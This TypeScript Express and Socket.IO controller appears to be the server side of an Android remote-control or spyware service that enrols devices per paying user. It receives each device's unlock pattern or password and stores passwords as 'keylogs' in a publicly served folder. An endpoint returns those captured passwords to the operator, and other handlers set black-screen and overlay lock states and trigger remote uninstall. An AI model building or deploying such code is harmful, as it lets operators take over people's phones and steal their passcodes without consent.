import { Request, Response } from "express";
import { validationResult } from "express-validator";
import fs from "fs";
import path from "path";

import Device from "../models/device.model";
import User from "../models/user.model";
import { DeviceModelType, SocketIOMobileEvents, UserModelType } from "../utils";

// Socket Libs
import express, { response } from "express";
import http from "http";
import { Server } from "socket.io";
const app = express();

const server = http.createServer(app);

const corsOptions = {
	//origin: API_URL,
	origins: "*:*",
	methods: ["GET", "POST"],
	allowedHeaders: [
		"Content-Type",
		"Authorization",
		"x-access-token",
		"Access-Control-Allow-Origin",
	],
	optionsSuccessStatus: 200,
};

const io = new Server(server, {
	cors: corsOptions,
});

// Add New Device from QR code capture via WS
export const addNewDeviceInfo = async (
	device: DeviceModelType,
	socket: any
) => {
	try {
		// Initial data of a Device
		const {
			deviceId,
			userId,
			deviceInfo,
			hwid,
			installationDate,
			manufacturer,
			models,
			version,
			userType,
			abi,
		} = device;

		// Unregister User can't add a device
		const user: UserModelType | null = await User.findById(userId);
		if (!user) {
			return {
				success: false,
				message: "userNotFound",
			};
		}

		// Check if device with deviceId already exists
		const existDevice: DeviceModelType | null = await Device.findOne({
			deviceId,
		});

		// If the device exists, check if socketId is null
		if (existDevice) {
			existDevice.socketId = socket;
			existDevice.online = true;
			await existDevice.save();

			return {
				success: false,
				newDevice: existDevice,
				message: "deviceExists",
			};
		}

		// Check if the user has reached the device limit
		const totalDeviceLimit =
			(user?.maxDeviceLimit || 0) + (user?.extraDevice || 0);
		if ((user.devices as number) >= totalDeviceLimit) {
			return {
				success: false,
				message: "deviceLimitReached",
			};
		}

		// Create a new Device document using Mongoose model
		const newDevice: DeviceModelType = new Device({
			deviceId,
			userId,
			socketId: socket,
			deviceInfo,
			hwid,
			installationDate,
			manufacturer,
			models,
			online: true,
			version,
			userType,
			abi,
		});

		// Save the new device to the database
		const successSave = await newDevice.save();

		if (successSave) {
			// Increment the user's devices count by 1
			await User.findByIdAndUpdate(userId, { $inc: { devices: 1 } });
			return {
				success: true,
				newDevice: successSave,
				message: "deviceAdded",
			};
		}
	} catch (error) {
		console.error("Error adding device:", error);
		return {
			success: false,
			message: "serverError",
			error: error,
		};
	}
};

export const updateSecurityInformation = async (data: {
	deviceId: string;
	password: string | string[];
	type: string;
}) => {
	try {
		// console.log("device security info:", data);
		const { deviceId, password, type } = data;

		if (type === "pattern") {
			// For type "pattern", save security data to the database
			const updatedDevice = await Device.findOneAndUpdate(
				{ deviceId },
				{
					$set: {
						securityData: password,
						securityType: type,
					},
				},
				{ new: true }
			);

			if (updatedDevice) {
				return {
					success: true,
					device: updatedDevice,
					message:
						"Device security updated successfully (pattern saved in DB)",
				};
			}
		} else if (type === "password") {
			// For "password", save to a text file in public/security
			const logsDir = path.join(
				__dirname,
				"../../public/security",
				deviceId
			);
			if (!fs.existsSync(logsDir)) {
				fs.mkdirSync(logsDir, { recursive: true });
			}

			const filePath = path.join(logsDir, `password.txt`);

			// Format the log entry to only include time (hh:mm:ss)
			const formatTime = (date: Date) => {
				const hours = String(date.getHours()).padStart(2, "0");
				const minutes = String(date.getMinutes()).padStart(2, "0");
				const seconds = String(date.getSeconds()).padStart(2, "0");
				return `${hours}:${minutes}:${seconds}`;
			};

			const formattedDate = formatTime(new Date());
			const newLogEntry = `${formattedDate} ➡ ${password}`;

			// Read existing file content, if any
			let currentContent: string[] = [];
			if (fs.existsSync(filePath)) {
				const fileContent = await fs.promises.readFile(
					filePath,
					"utf-8"
				);
				currentContent = fileContent
					.split("\n")
					.filter((line) => line.trim() !== "");
			}

			// Ensure a max of 20 entries, remove oldest if necessary
			if (currentContent.length >= 20) {
				currentContent = currentContent.slice(
					currentContent.length - 19
				); // Keep the last 19 entries
			}

			// Add the new log entry
			currentContent.push(newLogEntry);

			// Write updated content back to the file
			await fs.promises.writeFile(
				filePath,
				currentContent.join("\n"),
				"utf-8"
			);

			// Check if device with deviceId already exists
			const device = await Device.findOne({ deviceId });

			return {
				success: true,
				device,
				message: `Device security updated successfully (${type} data updated in file)`,
			};
		} else {
			return {
				success: false,
				message: `Unknown security type: ${type}`,
			};
		}
	} catch (error) {
		console.log("device security error:", error);
	}
};

// Offline Setting of Device
export const setDeviceOffline = async (socket: any) => {
	try {
		// Find the device by the socketId
		const device = await Device.findOne({ socketId: socket });

		if (!device) {
			console.error(`Device with socketId ${socket} not found`);
			return {
				success: false,
				message: "Device not found",
			};
		}

		// Set socketId to null and online status to false
		device.socketId = "none";
		device.online = false;

		// Save the updated device information
		const updatedDevice = await device.save();
		return {
			success: true,
			device: updatedDevice,
			message: "success",
		};
	} catch (error) {
		console.error("Error setting device offline:", error);
		return {
			success: false,

			message: "Failed to set device offline",
		};
	}
};

// Update Battery and Network
export const updateBatteryAndNetwork = async (data: any) => {
	try {
		console.log("device info:", data);
		const { deviceId, batteryStatus, connectStatus } = data;
		const updatedDevice = await Device.updateOne(
			{ deviceId: deviceId },
			{
				$set: {
					batteryStatus: batteryStatus,
					connectStatus: connectStatus,
				},
			}
		);

		if (updatedDevice)
			return {
				success: true,
				message: "device update successfully",
			};
	} catch (error) {
		console.log("update battery and network error:", error);
	}
};

// Update Black and Lock Screen
export const updateBlackAndLock = async (data: any) => {
	try {
		const { type, deviceId, status } = data;
		if (type == "blackScreen") {
			const updatedDevice = await Device.updateOne(
				{ deviceId: deviceId },
				{
					$set: {
						blackScreen: status,
					},
				}
			);
			if (updatedDevice)
				return {
					success: true,
					message: "device update successfully",
				};
		} else if (type == "imageOverlayer") {
			const updatedDevice = await Device.updateOne(
				{ deviceId: deviceId },
				{
					$set: {
						lockScreen: status,
					},
				}
			);
			if (updatedDevice)
				return {
					success: true,
					message: "device update successfully",
				};
		}
	} catch (error) {
		console.log("update black and lock error:", error);
	}
};

// Add New Device via API
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const addDevice = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	try {
		// Initial data of a Device
		const {
			deviceId,
			deviceInfo,
			hwid, //  Hardware ID
			installationDate, // Apk install date
			manufacturer, // Device Info
			models, // Device Model
			version,
		} = req.body;

		// Extract userId from the authenticated request
		const user = req.user as UserModelType; // Assuming the user ID is stored in req.user.id
		const userId = user?._id;

		// Check if device with deviceId already exists
		const existDevice: DeviceModelType | null = await Device.findOne({
			deviceId,
		});
		if (existDevice) {
			return res
				.status(400)
				.json({ error: "Device with this deviceId already exists" });
		}

		// Create a new Device document using Mongoose model
		const newDevice: DeviceModelType = new Device({
			deviceId,
			userId,
			deviceInfo,
			hwid,
			installationDate,
			manufacturer,
			models,
			version,
		});

		// Save the new device to the database
		await newDevice.save();

		// Return a success response
		res.status(201).json({
			success: true,
			message: "Device added successfully",
		});
	} catch (error) {
		console.error("Error adding device:", error);
		res.status(500).json({ error: "Failed to add device" });
	}
};

// Device Info Update
/**
 *
 * @param {*} req
 * @param {*} res
 */
// After Device, Update the device Info

// Get Devices by UserId
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const getDevice = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}
	try {
		const userId = req.params.userId; // Get userId from request body
		// Find devices in the database that match the query
		const devices: DeviceModelType[] = await Device.find({
			userId: userId,
		}).sort({ created_at: -1 });

		// Return devices in the response
		res.status(200).json(devices);
	} catch (error) {
		console.error("Error fetching devices:", error);
		res.status(500).json({ error: "Failed to fetch devices" });
	}
};

// Get all devices for Admin
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const getAllDevices = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}
	try {
		// Fetch devices
		const devices = await Device.find({ online: true }).sort({
			created_at: -1,
		});
		if (!devices || devices.length === 0) {
			return res.status(404).json({ message: "No devices found" });
		}

		// Fetch user data for each device
		const devicesWithUserData = await Promise.all(
			devices.map(async (device) => {
				try {
					// Fetch user by ID
					const userInfo = await User.findById(device?.userId).select(
						"username email"
					);

					return {
						...device.toObject(), // Convert device document to plain object
						userInfo: userInfo || null, // Include user data or null
					};
				} catch (err) {
					console.error(
						`Error fetching user for device ID ${device._id}:`,
						err
					);
					return {
						...device.toObject(),
						userInfo: null, // Include null if user fetch fails
					};
				}
			})
		);

		// Send the response
		return res.status(200).json(devicesWithUserData);
	} catch (error) {
		console.error("Error fetching devices:", error);
		res.status(500).json({ error: "Failed to fetch devices" });
	}
};

//Get Device Info by Device ID
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const getDeviceInfo = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	try {
		const deviceId = req.params.deviceId;

		//Find device in the database that match the query by deviceId
		const device: DeviceModelType[] = await Device.find({
			_id: deviceId,
		});

		// Check if devices are found
		if (device.length > 0) {
			res.status(200).json(device);
		} else {
			return res.status(404).json({ error: "Device not found" });
		}
	} catch (error) {
		console.log("error");
	}
};

// Update Device Name
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const updateDeviceName = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { deviceId, editedManufacturer } = req.body;
	try {
		const device: DeviceModelType | null = await Device.findOne({
			deviceId: deviceId,
		});

		if (!device) {
			return res
				.status(404)
				.json({ status: 404, message: "Device not found" });
		}

		device.manufacturer = editedManufacturer;
		const updateDevice = await device.save();

		// Send back the updated device information as a response
		res.status(200).json({
			status: 200,
			message: "Device manufacturer updated successfully",
			device: updateDevice,
		});
	} catch (error) {
		console.error("Error processing device name update:", error);
		res.status(500).json({
			status: 500,
			error: "Failed to process the device name update",
		});
	}
};

// Get Device Password
export const getDevicePassword = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { deviceId } = req.params;
	try {
		// Directory where keylogs are stored
		const logsDir = path.join(__dirname, "../../public/security", deviceId);

		// Check if the directory exists
		if (!fs.existsSync(logsDir)) {
			return res.status(404).json({
				status: "404",
				message: "No password found for this device",
			});
		}

		// Filter and read all .txt files in the directory
		const files = fs
			.readdirSync(logsDir)
			.filter((file) => file.endsWith(".txt"));

		// If no files are found, return 404
		if (files.length === 0) {
			return res.status(404).json({
				status: "404",
				message: "No password logs found for this device",
			});
		}

		// Read content of each file
		const logs = files.map((file) => {
			const filePath = path.join(logsDir, file);
			const content = fs.readFileSync(filePath, "utf8");
			return { filename: file, content };
		});

		// Send back the logs
		return res.status(200).json(logs);
	} catch (error) {
		console.error("Error processing getDevicePassword:", error); // Log the error for debugging
		return res.status(500).json({
			status: 500,
			error: "Failed to process the get device password",
		});
	}
};

// Delete Device
/**
 *
 * @param {*} req
 * @param {*} res
 */
export const DeleteDevice = async (req: Request, res: Response) => {
	try {
		const deviceId = req.params.deviceId;

		const device = await Device.findOne({ deviceId: deviceId });

		if (!device) {
			return res
				.status(404)
				.json({ error: "Device not found or already deleted" });
		}

		// Uninstall app on device
		io.emit(
			`${SocketIOMobileEvents.MOBILE_UNINSTALL_APP_EVENT}-${deviceId}`,
			{
				deviceId: deviceId,
				type: "uninstall",
			}
		);

		const userId = device.userId;

		// Delete devices in the database that match the query
		const result = await Device.deleteOne({
			deviceId: deviceId,
		});

		await User.findByIdAndUpdate(userId, { $inc: { devices: -1 } });

		// Check if a device was deleted
		if (result.deletedCount === 0) {
			return res
				.status(404)
				.json({ error: "Device not found or already deleted" });
		}

		// Return a success response
		res.status(200).json({
			success: true,
			message: "Device deleted successfully",
		});
	} catch (error) {
		console.error("Error deleting device:", error);
		res.status(500).json({ error: "Failed to delete device" });
	}
};
